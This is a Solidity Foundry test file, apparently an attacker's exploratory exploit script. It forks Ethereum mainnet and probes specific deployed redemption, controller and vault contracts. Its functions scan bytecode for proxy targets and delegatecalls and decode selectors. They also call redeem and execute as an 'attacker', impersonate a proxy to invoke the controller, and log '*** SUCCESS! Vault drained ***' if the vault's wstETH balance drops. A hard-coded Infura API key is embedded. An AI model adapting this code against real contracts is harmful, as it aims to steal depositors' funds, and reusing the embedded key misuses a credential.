// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MinimalProxyExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // Addresses found in REDEMPTION_1 storage
    address constant SLOT4_PROXY = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeMinimalProxy() public view {
        console.log("=== ANALYZING MINIMAL PROXY AT SLOT 4 ===\n");

        bytes memory proxyCode = SLOT4_PROXY.code;
        console.log("Proxy code size:", proxyCode.length);
        console.log("Proxy bytecode:");
        console.logBytes(proxyCode);

        // Minimal proxy pattern is: 363d3d373d3d3d363d73<address>5af43d82803e903d91602b57fd5bf3
        // Let's extract the implementation address

        // Look for the implementation address pattern (PUSH20 = 0x73)
        for (uint i = 0; i + 20 < proxyCode.length; i++) {
            if (uint8(proxyCode[i]) == 0x73) { // PUSH20
                // Extract address manually
                bytes memory addrBytes = new bytes(20);
                for (uint j = 0; j < 20; j++) {
                    addrBytes[j] = proxyCode[i + 1 + j];
                }
                address impl = address(bytes20(addrBytes));
                console.log("\nFound PUSH20 at offset", i, ":");
                console.log("  Address:", impl);
                console.log("  Code size:", impl.code.length);
            }
        }
    }

    function test_AnalyzeSlot5Contract() public view {
        console.log("=== ANALYZING SLOT 5 CONTRACT ===\n");

        bytes memory code = SLOT5_IMPL.code;
        console.log("Code size:", code.length);

        // Count opcodes
        uint delegatecallCount = 0;
        uint callCount = 0;
        uint sloadCount = 0;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;
            if (uint8(code[i]) == 0xf1) callCount++;
            if (uint8(code[i]) == 0x54) sloadCount++;
        }

        console.log("DELEGATECALL count:", delegatecallCount);
        console.log("CALL count:", callCount);
        console.log("SLOAD count:", sloadCount);

        // Check its storage
        console.log("\nSlot 5 contract storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(SLOT5_IMPL, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_TryDirectCallToSlot4() public {
        console.log("=== TRYING DIRECT CALL TO SLOT 4 PROXY ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling the proxy directly
        console.log("Trying various calls to SLOT4_PROXY...");

        // Maybe it has a redeem function
        (bool s1,) = SLOT4_PROXY.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address) success:", s1);

        (bool s2,) = SLOT4_PROXY.call(
            abi.encodeWithSignature("execute(bytes)", abi.encode(attacker))
        );
        console.log("execute(bytes) success:", s2);

        (bool s3,) = SLOT4_PROXY.call{value: 1 ether}("");
        console.log("ETH transfer success:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** SUCCESS! Vault drained via SLOT4_PROXY ***");
        }
    }

    function test_DecodeKnownSelectors() public pure {
        console.log("=== DECODING KNOWN SELECTORS ===\n");

        // From REDEMPTION_1 selectors
        console.log("0x715018a6 = renounceOwnership()");
        console.log("0xf2fde38b = transferOwnership(address)");
        console.log("0x8da5cb5b = owner()");
        console.log("0x5c975abb = paused()");
        console.log("0x42966c68 = burn(uint256)");
        console.log("0x70a08231 = balanceOf(address)");
        console.log("0x23b872dd = transferFrom(address,address,uint256)");
        console.log("0xa9059cbb = transfer(address,uint256)");
        console.log("0x79ba5097 = acceptOwnership()");
        console.log("0xeda72134 = TASSET()");

        // Calculate some selectors to identify functions
        console.log("\nCalculating selectors:");
        console.log("claim():");
        console.logBytes4(bytes4(keccak256("claim()")));
        console.log("redeem(uint96):");
        console.logBytes4(bytes4(keccak256("redeem(uint96)")));
        console.log("finalizeRedeem(uint256):");
        console.logBytes4(bytes4(keccak256("finalizeRedeem(uint256)")));
        console.log("cancelRedeem(uint256):");
        console.logBytes4(bytes4(keccak256("cancelRedeem(uint256)")));
        console.log("withdraw(uint256):");
        console.logBytes4(bytes4(keccak256("withdraw(uint256)")));
        console.log("deposit(uint256):");
        console.logBytes4(bytes4(keccak256("deposit(uint256)")));
    }

    function test_Redemption1DelegatesTo() public view {
        console.log("=== WHERE DOES REDEMPTION_1 DELEGATE TO? ===\n");

        // If REDEMPTION_1 delegatecalls to SLOT4_PROXY or SLOT5_IMPL,
        // and we can control those, we win

        bytes memory code = REDEMPTION_1.code;

        // Find all PUSH20 in REDEMPTION_1 bytecode
        console.log("PUSH20 addresses in REDEMPTION_1:");
        for (uint i = 0; i + 20 < code.length; i++) {
            if (uint8(code[i]) == 0x73) { // PUSH20
                bytes memory addrBytes = new bytes(20);
                for (uint j = 0; j < 20; j++) {
                    addrBytes[j] = code[i + 1 + j];
                }
                address addr = address(bytes20(addrBytes));
                if (addr.code.length > 0) {
                    console.log("  Found at offset", i, ":");
                    console.log("    Address:", addr);
                }
            }
        }
    }

    function test_CheckIfSlot4CanCallRC() public {
        console.log("=== CHECKING IF SLOT4 CAN CALL RC ===\n");

        // If SLOT4_PROXY can call RC.redeem, that's our entry point
        // Let's see if SLOT4_PROXY is registered in RC

        // Check RC's redemption mapping
        console.log("Checking RC redemption mapping for SLOT4_PROXY:");
        bytes32 slot = keccak256(abi.encode(SLOT4_PROXY, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, slot);
        console.logBytes32(val);

        // Try pranking as SLOT4_PROXY
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(SLOT4_PROXY);
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        vm.stopPrank();

        console.log("\nSLOT4_PROXY calling RC.redeem success:", success);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("*** SLOT4_PROXY CAN DRAIN VAULT! ***");
        }
    }

    function test_InvestigateRedemption1DelegatecallPattern() public view {
        console.log("=== REDEMPTION_1 DELEGATECALL PATTERN ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find all DELEGATECALLs and what they target
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                console.log("\nDELEGATECALL at offset:", i);

                // Check 50 bytes before for SLOAD/PUSH20
                uint start = i > 50 ? i - 50 : 0;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD before at:", j);
                    }
                    if (uint8(code[j]) == 0x73) {
                        bytes memory addrBytes = new bytes(20);
                        for (uint k = 0; k < 20 && j + 1 + k < code.length; k++) {
                            addrBytes[k] = code[j + 1 + k];
                        }
                        address addr = address(bytes20(addrBytes));
                        console.log("  PUSH20 before at:", j);
                        console.log("    Address:", addr);
                    }
                }
            }
        }
    }
}
